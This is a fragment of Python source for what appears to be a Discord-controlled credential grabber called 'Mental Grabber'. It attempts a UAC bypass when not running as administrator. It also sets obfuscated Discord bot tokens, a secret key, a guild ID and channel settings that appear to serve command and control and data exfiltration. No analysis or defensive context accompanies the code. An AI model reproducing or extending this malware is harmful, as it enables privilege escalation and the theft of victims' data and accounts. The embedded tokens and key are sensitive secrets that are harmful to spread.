...
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['NZ2b0ZVdoZGexBDbJdkQfNkUKFEdE1CbyFXQV50VSNHdGlWTJllLmxkVBN3RucnTxsmaNhXT61UeRpnTxUkaOBTUq10dJRVT', '3JlTT1mQZJkRux0YVZVR1IDSpJnQ30yR1EVRNFVb0BnRslGdfplLjlTU5k3RuEkTxkFRPVTWq1UNRRUTzsGRNhXUq10dJRVT']
software_registry_name = 'Mental Grabber'
software_directory_name = 'Mental Grabber'
software_executable_name = 'Mental Grabber.exe'
channel_ids = {                                                    ##
    'info': True,
    'main': True,
    'spam': True,
...
secret_key = '8a191149775f70d4bd25e68d29095d7e4145a10fa3f08e3b0ceca8f1ae82330e'
guild_id = 1202445760579506288
